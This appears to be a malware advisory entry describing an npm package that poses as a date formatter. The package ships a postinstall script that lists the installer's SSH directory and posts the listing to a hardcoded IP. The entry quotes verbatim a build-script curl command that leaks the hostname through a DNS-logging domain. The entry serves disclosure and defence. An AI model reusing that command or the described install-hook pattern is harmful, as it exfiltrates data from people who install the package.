summary: SSH key exfiltration payload disguised as date utility
details: Package self-describes as 'A simple date formatting utility' with a trivial 6-line index.js, but ships a sibling postinstall.js that enumerates the installer's ~/.ssh directory (reading public key filenames via fs.readdirSync) and POSTs the listing along with username and platform to a hardcoded bare IP at https://124.221.154.135/post. Author comments in postinstall.js explicitly label the code as an SSH-key-theft C2 demo. Additionally, package.json declares a build script `curl http://$(hostname).ac1f4008.log.dnslogs.dpdns.org` that exfiltrates the installer's hostname through a DNS-logging subdomain when `npm run build` is executed. The mismatch between advertised purpose (date formatter) and shipped payload (credential reconnaissance) is unambiguous evidence of malicious intent.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
